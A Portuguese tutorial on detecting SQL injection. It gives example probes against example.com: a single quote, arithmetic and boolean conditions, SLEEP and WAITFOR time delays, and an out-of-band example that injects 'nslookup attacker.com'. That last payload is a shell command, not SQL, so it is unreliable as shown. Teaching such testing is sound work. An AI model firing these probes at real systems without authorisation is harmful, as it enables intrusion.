# Detectando SQL Injection (SQLi)

SQL Injection (SQLi) é uma das vulnerabilidades mais comuns e perigosas em aplicações web. Ela ocorre quando um atacante pode inserir ou manipular consultas SQL através de entradas não validadas em uma aplicação. 

## 1. Detectando SQLi com Aspas Simples (`'`)

### Descrição

Uma das formas mais simples de testar uma aplicação para SQLi é inserir uma aspa simples (`'`) em pontos de entrada, como campos de formulário, parâmetros de URL, ou cabeçalhos HTTP. A aspa simples pode interromper a sintaxe de uma consulta SQL, gerando um erro que revela informações sobre a vulnerabilidade.

### Como Testar

1. **Insira uma aspa simples**: Envie uma aspa simples (`'`) em um ponto de entrada da aplicação.
2. **Observe a resposta**: Verifique se a aplicação retorna um erro de banco de dados ou um comportamento anômalo.

### Exemplo

- **Entrada**: `http://example.com/products?id=1'`
- **Resposta**: Se a aplicação retornar um erro como `syntax error`, `unexpected '`, ou `Unclosed quotation mark`, isso indica uma possível vulnerabilidade de SQLi.

### Interpretação dos Resultados

Se um erro de banco de dados for retornado, isso sugere que a aplicação está vulnerável a SQLi, pois o banco de dados tentou interpretar a aspa simples como parte de uma consulta SQL.

## 2. Detectando SQLi com Sintaxe SQL Específica

### Descrição

Uma técnica avançada para detectar SQLi é injetar pedaços de código SQL que resultam no valor original do ponto de entrada e em um valor diferente. Isso pode ajudar a identificar diferenças sistemáticas nas respostas da aplicação.

### Como Testar
1. **Entrada original**: Envie uma consulta com um valor simples, como `1`.
2. **Entrada modificada**: Envie uma consulta que modifique o valor, como `1-1` ou `1*1`.
3. **Compare as respostas**: Verifique se há diferenças sistemáticas na resposta da aplicação.

### Exemplo
- **Entrada original**: `http://example.com/products?id=1`
- **Entrada modificada**: `http://example.com/products?id=1-1`
- **Resposta**: Se o conteúdo da página mudar ou se o resultado da consulta SQL for diferente, isso pode indicar SQLi.

### Interpretação dos Resultados
Diferenças sistemáticas na resposta da aplicação indicam que a entrada do usuário está sendo processada diretamente em uma consulta SQL, sugerindo uma vulnerabilidade de SQLi.

## 3. Detectando SQLi com Condições Booleanas (`OR 1=1` e `OR 1=2`)

### Descrição

As condições booleanas são usadas para testar a injeção de SQL criando situações onde a consulta SQL sempre retorna verdadeira ou falsa. Isso ajuda a identificar vulnerabilidades baseadas nas diferenças de resposta da aplicação.

### Como Testar

1. **Injeção verdadeira**: Envie uma condição que seja sempre verdadeira, como `OR 1=1`.
2. **Injeção falsa**: Envie uma condição que seja sempre falsa, como `OR 1=2`.
3. **Observe as respostas**: Compare as respostas da aplicação para as duas condições.

### Exemplo

- **Entrada verdadeira**: `http://example.com/products?id=1 OR 1=1`
- **Entrada falsa**: `http://example.com/products?id=1 OR 1=2`
- **Resposta**: Se a aplicação retorna resultados diferentes para as duas entradas, isso sugere que a consulta SQL foi manipulada, indicando uma vulnerabilidade.

### Interpretação dos Resultados

Respostas diferentes para consultas verdadeiras e falsas indicam que a aplicação é vulnerável a SQLi, pois a consulta SQL está sendo manipulada para alterar o comportamento da aplicação.

## 4. Detectando SQLi com Payloads de Atraso de Tempo

### Descrição

Os ataques de tempo envolvem a injeção de consultas SQL que induzem atrasos deliberados, medindo o tempo de resposta da aplicação para identificar vulnerabilidades.

### Como Testar

1. **Injete um comando de atraso**: Utilize um payload que cause um atraso na execução da consulta SQL, como `SLEEP(5)` ou `WAITFOR DELAY '00:00:05'`.
2. **Meça o tempo de resposta**: Verifique se há um atraso significativo na resposta da aplicação.

### Exemplo

- **Entrada**: `http://example.com/products?id=1;SLEEP(5)`
- **Resposta**: Se a aplicação demora 5 segundos ou mais para responder, isso indica que o comando SQL foi executado, sugerindo uma vulnerabilidade.

### Interpretação dos Resultados

A presença de um atraso no tempo de resposta sugere que a aplicação executou a consulta SQL, indicando uma vulnerabilidade de SQLi.

## 5. Detectando SQLi com Payloads OAST

### Descrição

Os ataques OAST (Out-Of-Band Application Security Testing) envolvem o envio de payloads que tentam induzir a aplicação a realizar uma interação de rede externa, como uma solicitação DNS ou HTTP, que pode ser monitorada por um servidor controlado pelo atacante.

### Como Testar

1. **Configure um servidor para capturar interações externas**: Use uma ferramenta como Burp Collaborator ou um servidor próprio.
2. **Envie o payload OAST**: Insira um payload que tente disparar uma interação fora da banda, como uma solicitação DNS.
3. **Monitore interações externas**: Verifique se o servidor configurado capturou qualquer solicitação.

### Exemplo

- **Entrada**: `http://example.com/products?id=1;nslookup attacker.com`
- **Resposta**: Se seu servidor capturar uma solicitação DNS para `attacker.com`, isso indica que a consulta SQL foi executada, sugerindo uma vulnerabilidade.

### Interpretação dos Resultados

Se uma interação fora da banda for capturada, isso indica que a aplicação está executando consultas SQL injetadas, confirmando a vulnerabilidade de SQLi.
